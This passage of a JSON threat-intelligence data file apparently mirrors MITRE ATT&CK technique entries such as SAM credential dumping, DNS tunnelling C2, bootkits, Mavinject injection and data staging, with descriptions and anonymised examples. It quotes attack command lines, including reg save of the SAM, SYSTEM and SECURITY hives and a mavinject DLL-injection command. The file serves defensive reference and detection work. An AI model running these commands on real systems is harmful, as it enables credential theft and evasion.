    "id": "T1583.008"
  },
  "attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011": {
    "name": "Security Account Manager",
    "example_uses": [
      "can dump usernames and hashed passwords from the SAM.",
      "can dump Windows password hashes from the SAM.",
      "used reg commands to dump specific hives from the Windows Registry such as the SAM hive and obtain password hashes.",
      "has used the `reg save` command to save registry hives.",
      "can gather hashed passwords by dumping SAM/SECURITY hive.",
      "has extracted the SAM and SYSTEM registry hives using the `reg.exe` binary for obtaining password hashes from a compromised machine.",
      "During   copied the `SAM` and `SYSTEM` Registry hives for credential harvesting.",
      "can be used to dump credentials from the SAM.",
      "has dropped and executed SecretsDump to dump password hashes.",
      "has dumped credentials including by using gsecdump.",
      "has the capability to harvest credentials and passwords from the SAM database.",
      "During  threat actors dumped account hashes using .",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from the SAM table.",
      "extracted user account data from the Security Account Managerr (SAM) making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies.",
      "can dump the SAM database.",
      "has copied and exfiltrated the SAM Registry hive from targeted systems.",
      "has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",
      "Password stealer and NTLM stealer modules in  harvest stored credentials from the victim including credentials used as part of Windows NTLM user authentication.",
      "actors have used  to dump credentials. They have also dumped credentials from domain controllers.",
      "has the capability to gather NTLM password information.",
      "SecretsDump and  modules within  can perform credential dumping to obtain account and password information.",
      "During  the threat actors leveraged a custom tool to dump OS credentials and used following commands: `reg save HKLM\\\\SYSTEM system.hiv` `reg save HKLM\\\\SAM sam.hiv` and `reg save HKLM\\\\SECURITY security.hiv` to dump SAM SYSTEM and SECURITY hives.",
      "has the ability to dump password hashes.",
      "has acquired credentials from the SAM/SECURITY registry hives.",
      "collects Windows account hashes.",
      "can recover hashed passwords.",
      "Credential Dumper module can dump encrypted password hashes from SAM registry keys including `HKLM\\SAM\\SAM\\Domains\\Account\\F` and `HKLM\\SAM\\SAM\\Domains\\Account\\Users\\*\\V`.",
      "can dump Windows password hashes.",
      "used  to dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction.",
      "dumped the SAM file on victim machines to capture credentials.",
      "acquires victim credentials by extracting registry hives such as the Security Account Manager through commands such as reg save.",
      "During  the adversary retrieved the contents of the Security Account Manager (SAM) hive in the victim environment for credential capture.",
      "During   used the following commands to dump SAM SYSTEM and SECURITY hives: reg save hklm\\sam reg save hklm\\system and reg save hklm\\security."
    ],
    "description": "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the net user command. Enumerating the SAM database requires SYSTEM level access.A number of tools can be used to retrieve the SAM file through in-memory techniques:* pwdumpx.exe* [gsecdump](https://attack.mitre.org/software/S0008)* [Mimikatz](https://attack.mitre.org/software/S0002)* secretsdump.pyAlternatively, the SAM can be extracted from the Registry with Reg:* reg save HKLM\\sam sam* reg save HKLM\\system systemCreddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)Notes: * RID 500 account is the local, built-in administrator.* RID 501 is the guest account.* User accounts start with a RID of 1,000+.",
    "similar_words": [
      "Security Account Manager"
    ],
    "id": "T1003.002"
  },
  "attack-pattern--166de1c6-2814-4fe5-8438-4e80f76b169f": {
    "name": "WHOIS",
    "example_uses": [],
    "description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.(Citation: WHOIS)Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "WHOIS"
    ],
    "id": "T1596.002"
  },
  "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada": {
    "name": "System Firmware",
    "example_uses": [
      "is a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.",
      "performs BIOS modification and can download and execute a file as well as protect itself from removal.",
      "is a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems."
    ],
    "description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.(Citation: Wikipedia BIOS)(Citation: Wikipedia UEFI)(Citation: About UEFI)System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "similar_words": [
      "System Firmware"
    ],
    "id": "T1542.001"
  },
  "attack-pattern--16cdd21f-da65-4e4f-bc04-dd7d198c7b26": {
    "name": "Search Victim-Owned Websites",
    "example_uses": [
      "has searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code branding and organizational contact information for phishing pages.",
      "During  threat actors peformed reconnaissance of victims' internal websites via proxied connections.",
      "has searched for information on the target company's website.",
      "has used contact forms on victim websites to generate phishing e-mails.",
      "has conducted research against potential victim websites as part of its operational planning.",
      "has conducted pre-compromise reconnaissance on victim-owned sites.",
      "has filled out contact forms on victims' websites to direct them to adversary-controlled URLs.",
      "involved access of external victim websites for target development.",
      "enumerated compromised web application resources to identify additional endpoints and resources linkd to the website for follow-on access during ."
    ],
    "description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).In addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015) ",
    "similar_words": [
      "Search Victim-Owned Websites"
    ],
    "id": "T1594"
  },
  "attack-pattern--16e94db9-b5b1-4cd0-b851-f38fbd0a70f2": {
    "name": "Cloud Groups",
    "example_uses": [
      "During   accessed Azure AD to download bulk lists of group members and their Active Directory attributes.",
      "can enumerate Azure AD groups.",
      "can enumerate Azure AD groups.",
      "can enumerate IAM permissions."
    ],
    "description": "Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.With authenticated access there are several tools that can be used to find permissions groups. The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command az ad user get-member-groups will list groups associated to a user account for Azure while the API endpoint GET https://cloudidentity.googleapis.com/v1/groups lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS GetBucketAcl API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.",
    "similar_words": [
      "Cloud Groups"
    ],
    "id": "T1069.003"
  },
  "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c": {
    "name": "Services Registry Permissions Weakness",
    "example_uses": [
      "During  the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into the `svchost.exe` process."
    ],
    "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the services Registry tree. For example, the FailureCommand key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)The Performance key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the Performance key is not already present and if an adversary-controlled user has the Create Subkey permission, adversaries may create the Performance key in the services Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)Adversaries may also add the Parameters key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the services file may be identified using HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.(Citation: malware_hides_service)",
    "similar_words": [
      "Services Registry Permissions Weakness"
    ],
    "id": "T1574.011"
  },
  "attack-pattern--17fd695c-b88c-455a-a3d1-43b6cb728532": {
    "name": "DNS/Passive DNS",
    "example_uses": [],
    "description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a targets subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
    "similar_words": [
      "DNS/Passive DNS"
    ],
    "id": "T1596.001"
  },
  "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9": {
    "name": "Application Exhaustion Flood",
    "example_uses": [],
    "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
    "similar_words": [
      "Application Exhaustion Flood"
    ],
    "id": "T1499.003"
  },
  "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720": {
    "name": "Compromise Software Dependencies and Development Tools",
    "example_uses": [
      "adds malicious code to a host's Xcode projects by enumerating CocoaPods target_integrator.rb files under the /Library/Ruby/Gems folder or enumerates all .xcodeproj folders under a given directory.  then downloads a script and Mach-O file into the Xcode project folder."
    ],
    "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
    "similar_words": [
      "Compromise Software Dependencies and Development Tools"
    ],
    "id": "T1195.001"
  },
  "attack-pattern--19401639-28d0-4c3c-adcc-bc2ba22f6421": {
    "name": "Digital Certificates",
    "example_uses": [
      "has obtained free Let's Encrypt SSL certificates for use on their phishing pages.",
      "has obtained SSL certificates for their C2 domains.",
      "For  the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.",
      "has used a valid digital certificate for some of their malware.",
      "has used valid stolen digital certificates for some of their malware and tools.",
      "included the use of digital certificates spoofing Microsoft.",
      "created new certificates using a technique called the actors performed certificate impersonation a technique in which  obtained a certificate authority-signed X.509 certificate from another provider for the same domain imitating the one already used by the targeted organization.",
      "acquired Cloudflare Origin CA TLS certificates during ."
    ],
    "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)After obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
    "similar_words": [
      "Digital Certificates"
    ],
    "id": "T1588.004"
  },
  "attack-pattern--197ef1b9-e764-46c3-b96c-23f77985dc81": {
    "name": "DNS Server",
    "example_uses": [
      "has acquired dynamic DNS services for use in the targeting of intended victims.",
      "has set up custom DNS servers to send commands to compromised hosts via TXT records.",
      "built adversary-in-the-middle DNS servers to impersonate legitimate services that were later used to capture credentials."
    ],
    "description": "Adversaries may set up their own Domain Name System (DNS) servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of hijacking existing DNS servers, adversaries may opt to configure and run their own DNS servers in support of operations.By running their own DNS servers, adversaries can have more control over how they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)). With control over a DNS server, adversaries can configure DNS applications to provide conditional responses to malware and, generally, have more flexibility in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)",
    "similar_words": [
      "DNS Server"
    ],
    "id": "T1583.002"
  },
  "attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967": {
    "name": "Disk Wipe",
    "example_uses": [],
    "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",
    "similar_words": [
      "Disk Wipe"
    ],
    "id": "T1561"
  },
  "attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72": {
    "name": "DNS",
    "example_uses": [
      "has the ability to communicate with its C2 over DNS.",
      "uses DNS for C2 communications.",
      "has used DNS tunneling for C2 communications.",
      "has used DNS TXT requests as for its C2 communication.",
      "can cloak command and control traffic in DNS records from legitimate services to avoid reputation-based detection techniques.",
      "uses DNS TXT records for C2.",
      "Variants of  can communicate over DNS through queries to the server for constructed domain names with embedded information.",
      "has the ability to use DNS for C2 communications.",
      "has used DNS requests over UDP port 53 for C2.",
      "can use DNS for C2.",
      "supports DNS-based C2 profiles.",
      "has used DNS to communicate with the C2.",
      "has used  to encapsulate C2 in DNS traffic.",
      "can use DNS for C2 communications.",
      "During  threat actors used DNS to tunnel IPv4 C2 traffic.",
      "has the ability to use DNS tunneling for C2 communications.",
      "can use a DNS tunneling plugin to exfiltrate data by adding it to the subdomain portion of a DNS request.",
      "uses DNS as its C2 protocol.",
      "can use use IPv4 A records and IPv6 AAAA DNS records in C2 communications.",
      "can use DNS tunneling for C2 communications.",
      "can direct queries to custom DNS servers and return C2 commands using TXT records.",
      "can use a custom command and control protocol that can be encapsulated in DNS. All protocols use their standard assigned ports.",
      "has the ability to use DNS in communication with C2.",
      "can use DNS and TXT records within its DNS tunneling protocol for command and control.",
      "can support C2 communications over DNS.",
      "can use DNS for C2 communications.",
      "has used DNS for command and control.",
      "can use DNS tunneling to communicate with C2.",
      "has leveraged dynamic DNS providers for C2 communications.",
      "used DNS for C2 communications.",
      "Variants of  can use DNS tunneling to communicate with C2.",
      "has used DNS tunneling for C2.",
      "has used DNS for C2 including the publicly available requestbin.net tunneling service.",
      "has used DNS tunneling for C2 communications.",
      "uses DNS for C2.",
      "malware RoyalDNS has used DNS for C2.",
      "has used remote access tools that leverage DNS in communications with C2.",
      "can communicate over DNS with the C2 server.",
      "has used a custom implementation of DNS tunneling to embed C2 communications in DNS requests and replies.",
      "communicates via DNS for C2.",
      "uses DNS for the C2 communications.",
      "backdoor has communicated to the C2 over the DNS protocol.",
      "can be configured to use DNS for command and control.",
      "used DNS for C2 traffic designed to mimic normal SolarWinds API communications.",
      "uses DNS for C2 communications.",
      "can use DNS over HTTPS for C2.",
      "uses DNS for C2.",
      "uses DNS TXT records for C2.",
      "has performed C2 using DNS via A OPT and TXT records.",
      "can use DNS in C2 communications.",
      "is capable of using DNS for C2.",
      "has encoded outbound C2 communications in DNS requests consisting of character strings made to resemble standard domain names. The actual information transmitted by  is contained in the part of the character string prior to the first . character.",
      "has used DNS tunnelling tools such as dnscat/2 and Iodine for C2 purposes."
    ],
    "description": "Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) ",
    "similar_words": [
      "DNS"
    ],
    "id": "T1071.004"
  },
  "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3": {
    "name": "Cloud Instance Metadata API",
    "example_uses": [
      "has queried the AWS instance metadata service for credentials.",
      "can query the query AWS and GCP metadata APIs for secrets.",
      "has queried the Cloud Instance Metadata API for cloud credentials."
    ],
    "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)The de facto standard across cloud service providers is to host the Instance Metadata API at http[:]//169.254.169.254.",
    "similar_words": [
      "Cloud Instance Metadata API"
    ],
    "id": "T1552.005"
  },
  "attack-pattern--1a80d097-54df-41d8-9d33-34e755ec5e72": {
    "name": "Securityd Memory",
    "example_uses": [
      "uses the keychaindump project to read securityd memory."
    ],
    "description": "An adversary with root access may gather credentials by reading `securityd`s memory. `securityd` is a service/daemon responsible for implementing security protocols such as encryption and authorization.(Citation: Apple Dev SecurityD) A privileged adversary may be able to scan through `securityd`'s memory to find the correct sequence of keys to decrypt the users logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.(Citation: OS X Keychain)(Citation: OSX Keydnap malware)In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apples keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.(Citation: OS X Keychain)(Citation: External to DA, the OS X Way) Apples `securityd` utility takes the users logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the users password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.(Citation: OS X Keychain)",
    "similar_words": [
      "Securityd Memory"
    ],
    "id": "T1555.002"
  },
  "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b": {
    "name": "Group Policy Discovery",
    "example_uses": [
      "has the ability to collect local admin information via GPO.",
      "surveys a system upon check-in to discover Group Policy details using the gpresult command.",
      "includes various modules for enumerating Group Policy.",
      "has the capability to execute gpresult.",
      "can capture information on group policy settings",
      "can identify victim environment Group Policy information.",
      "performed extensive Active Directory enumeration of victim environments during ."
    ],
    "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)Adversaries may use commands such as gpresult or various publicly available PowerShell functions, such as Get-DomainGPO and Get-DomainGPOLocalGroup, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
    "similar_words": [
      "Group Policy Discovery"
    ],
    "id": "T1615"
  },
  "attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba": {
    "name": "Bootkit",
    "example_uses": [
      "has installed a bootkit on the system to maintain persistence.",
      "overwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.",
      "can implant malicious code into a compromised device's firmware.",
      "is a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.",
      "deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.",
      "is a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.",
      "Some  variants incorporate an MBR rootkit.",
      "malware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.",
      "has deployed a bootkit along with  to ensure its persistence on the victim. The bootkit shares code with some variants of ."
    ],
    "description": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)",
    "similar_words": [
      "Bootkit"
    ],
    "id": "T1542.003"
  },
  "attack-pattern--1bae753e-8e52-4055-a66d-2ead90303ca9": {
    "name": "Mavinject",
    "example_uses": [],
    "description": "Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  /HMODULE command-line parameter (ex. mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed)",
    "similar_words": [
      "Mavinject"
    ],
    "id": "T1218.013"
  },
  "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c": {
    "name": "Local Data Staging",
    "example_uses": [
      "stages the output from command execution and collected files in specific folders before exfiltration.",
      "can store collected data from an infected host to a file named `Hostname_UserName.txt` prior to exfiltration.",
      "has piped the output from executed commands to `/tmp/1`.",
      "can save collected data to disk different file formats and network shares.",
      "has saved files prior to upload from a compromised host to folders beginning with the characters `a9850d2f`.",
      "writes multiple outputs to a TMP file using the >> method.",
      "has locally staged encrypted archives for later exfiltration efforts.",
      "has collected stolen files in a temporary folder in preparation for exfiltration.",
      "has used tmp files to stage gathered information.",
      "can stage collected information including screen captures and logged keystrokes locally.",
      "During the  campaign  used staging folders that are infrequently used by legitimate users or processes to store data for exfiltration and tool deployment.",
      "scripts save memory dump data into a specific directory on hosts in the victim environment.",
      "has the ability to create files in a TEMP folder to act as a database to store information.",
      "stores collected data in log files before exfiltration.",
      "can stage local data in the Windows Registry.",
      "During  stolen data was copied into a text file using the format `From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt` prior to compression encoding and exfiltration.",
      "During  threat actors staged archived files in a temporary directory prior to exfiltration.",
      "copied all targeted files to a directory called index that was eventually uploaded to the C&C server.",
      "has stored the collected system files in a working directory.",
      "can place retrieved files into a destination directory.",
      "has stored collected files locally before exfiltration.",
      "creates a base directory that contains the files and folders that are collected.",
      "can stage data prior to exfiltration in %APPDATA%\\Microsoft\\UserSetting and %APPDATA%\\Microsoft\\UserSetting\\MediaCache.",
      "During  PowerView's file share enumeration results were stored in the file `c:\\ProgramData\\found_shares.txt`.",
      "has staged data on compromised systems prior to exfiltration often in `C:\\Users\\Public`.",
      "has aggregated collected credentials in text files before exfiltrating.",
      "determines a working directory where it stores all the gathered data about the compromised machine.",
      "has stored collected date in a .tmp file.",
      "has stored collected data under `%<malware_execution_folder>%\\\\CrashLog.txt`.",
      "stores output from command execution in a .dat file in the %TEMP% directory.",
      "malware IndiaIndia saves information gathered about the victim to a file that is saved in the %TEMP% directory then compressed encrypted and uploaded to a C2 server.",
      "can store captured system information locally prior to exfiltration.",
      "Modules can be pushed to and executed by  that copy data to a staging area compress it and XOR encrypt it.",
      "has staged collected data in a central upload directory prior to exfiltration.",
      "has staged stolen data locally on compromised hosts.",
      "can use a file exfiltration tool to copy files to C:\\ProgramData\\Adobe\\temp prior to exfiltration.",
      "has stored a decoy PDF file within a victim's `%temp%` folder.",
      "During   copied the local `SAM` and `SYSTEM` Registry hives to a staging directory.",
      "stores information gathered from the endpoint in a file named 1.hwp.",
      "stores files and logs in a folder on the local drive.",
      "can create directories to store plugin output and stage data for exfiltration.",
      "stages collected data in a text file.",
      "created folders in temp directories to host collected files before exfiltration.",
      "can write logged ACE credentials to `/home/perl/PAUS.pm` in append mode using the format string `%s:%s\\n`.",
      "can store email data in files and directories specified in its configuration such as C:\\Windows\\ServiceProfiles\\NetworkService\\appdata\\Local\\Temp\\.",
